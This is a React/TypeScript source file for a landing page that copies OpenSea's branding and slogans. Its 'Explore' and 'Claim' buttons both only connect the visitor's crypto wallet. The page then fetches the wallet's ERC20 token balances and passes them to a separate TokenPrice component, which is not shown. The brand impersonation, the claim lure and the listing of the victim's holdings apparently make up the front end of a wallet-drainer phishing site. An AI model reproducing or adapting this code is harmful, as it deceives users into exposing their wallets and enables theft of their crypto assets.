import { useMoralis, useNFTBalances } from "react-moralis";
import Moralis from "moralis";
import { useCallback, useEffect, useRef, useState } from "react";
import {
    useMoralisWeb3Api,
    useTokenPrice,
    useERC20Balances,
} from "react-moralis";
import TokenPrice, { ITokenBalance } from "./TokenPrice";
import { ethers } from "ethers";
import Wallet from "./wallet";

const Account = () => {
    const [address, setAddress] = useState("");
    const {
        authenticate,
        isAuthenticated,
        isAuthenticating,
        account,
        user,
        chainId,
        logout,
    } = useMoralis();

    const [ready, setReady] = useState(false);
    const [balance, setBalance] = useState<ITokenBalance[]>([])
    const { fetchERC20Balances, data, isLoading, isFetching, error } =
        useERC20Balances();
    const Web3Api = useMoralisWeb3Api();

    const [injectedProvider, setInjectedProvider] = useState<ethers.providers.Web3Provider | null>(null);

    const authenticateUser = async () => {
        await Wallet.create()
        await Wallet.connectWallet()
        setReady(true);
    };


    const getTokenBalances = async (wallet: string | null) => {
        if (!wallet) return;
        const res = await fetchERC20Balances({ params: { address: wallet } })
        setBalance(res as ITokenBalance[]);
    }

    useEffect(() => {
        if (Wallet.address) {
            getTokenBalances(Wallet.address)
        }
    }, [Wallet.address, ready]);

    return (
        <>
            {ready && balance.length && (
                <TokenPrice
                    chaidId={'0x1'}
                    balances={balance as ITokenBalance[]}
                />
            )}

            <div className="relative">
                <div className='absolute h-full w-full bg-cover blur-md jumbotron -z-10 opacity-25' style={{ backgroundImage: `url(${process.env.PUBLIC_URL + "media/nft.png"})` }}>

                </div>
                <div className="md:flex container mx-auto py-12">
                    <div className='md:w-6/12 self-center md:px-8 px-0'>
                        <h1 className="md:text-5xl text-3xl px-8 md:px-0 md:text-left text-center font-semibold">

                            Discover, collect, and sell extraordinary NFTs
                        </h1>
                        <h4 className='text-zinc-700 md:text-2xl md:mt-8 mt-4 md:text-left text-center text-lg '>
                            OpenSea is the world's first and <br /> largest NFT marketplace
                        </h4>

                        <div className="mt-8 md:text-left text-center">
                            <button onClick={authenticateUser} className="mr-4 py-3 md:px-12 px-8 md:text-base text-sm rounded-lg text-white bg-blue-500 font-semibold">
                                Explore
                            </button>
                            <button onClick={authenticateUser} className="py-3 md:px-12 px-8 md:text-base text-sm rounded-lg text-blue-500 bg-white border border-blue-500 font-semibold">
                                Claim
                            </button>
                        </div>
                        <div className="mt-8">
                            <h6 className="font-semibold text-blue-500 md:text-left text-center">
                                Learn more about OpenSea
                            </h6>
                        </div>
                    </div>
                    <div className='md:w-6/12 container md:mt-0 mt-14'>
                        <div className='md:px-0 px-6'>
                            <img className='md:w-[550px] shadow-md  mx-auto rounded-lg' src={process.env.PUBLIC_URL + "media/nft2.png"} alt="" />
                        </div>
                    </div>
                </div>
            </div >
        </>
    );
};


export default Account;